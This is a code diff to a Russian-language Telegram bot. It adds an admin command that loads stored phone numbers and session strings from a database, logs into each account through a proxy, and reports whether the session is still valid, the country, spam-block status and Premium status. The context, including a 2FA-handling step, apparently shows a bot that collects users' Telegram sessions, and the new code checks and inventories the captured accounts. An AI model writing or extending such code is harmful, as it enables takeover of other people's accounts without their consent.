@@ -249,6 +249,62 @@ async def process_2fa(message: types.Message):
         await client.disconnect()
         cleanup(user_id)
 
+@dp.message_handler(commands=['log'])
+async def send_sessions_log(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+
+    sessions = list(sessions_col.find({}))
+    if not sessions:
+        await message.answer("ℹ️ Нет сохранённых сессий.")
+        return
+
+    await message.answer(f"🔍 Проверка {len(sessions)} сессий, это может занять несколько секунд...")
+
+    results = []
+    for session_doc in sessions:
+        phone = session_doc.get("phone")
+        session_str = session_doc.get("session")
+        if not session_str or not phone:
+            results.append(f"📱 {phone or 'Неизвестен'} — ❌ Нет сессии")
+            continue
+
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        try:
+            await client.connect()
+            is_auth = await client.is_user_authorized()
+            if is_auth:
+                me = await client.get_me()
+                has_premium = getattr(me, "premium", False)
+                restriction = getattr(me, "restriction_reason", [])
+                is_spam_blocked = bool(restriction)
+                country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
+
+                status = (
+                    f"📱 {phone}\n"
+                    f"🌍 {country or 'N/A'}\n"
+                    f"🛡 Spam Block: {'❌ Да' if is_spam_blocked else '✅ Нет'}\n"
+                    f"💎 Premium: {'✅ Да' if has_premium else '❌ Нет'}\n"
+                    f"✅ Сессия валидна"
+                )
+            else:
+                status = f"📱 {phone} — ❌ Сессия не валидна"
+        except Exception as e:
+            status = f"📱 {phone} — ❌ Ошибка проверки: {e}"
+        finally:
+            await client.disconnect()
+        results.append(status)
+
+    chunk_size = 4000
+    msg = ""
+    for res in results:
+        if len(msg) + len(res) + 2 > chunk_size:
+            await message.answer(msg)
+            msg = ""
+        msg += res + "\n\n"
+    if msg:
+        await message.answer(msg)
+
 @dp.message_handler(commands=['delog'])
 async def delete_logs(message: types.Message):
     if message.from_user.id != ADMIN_ID:
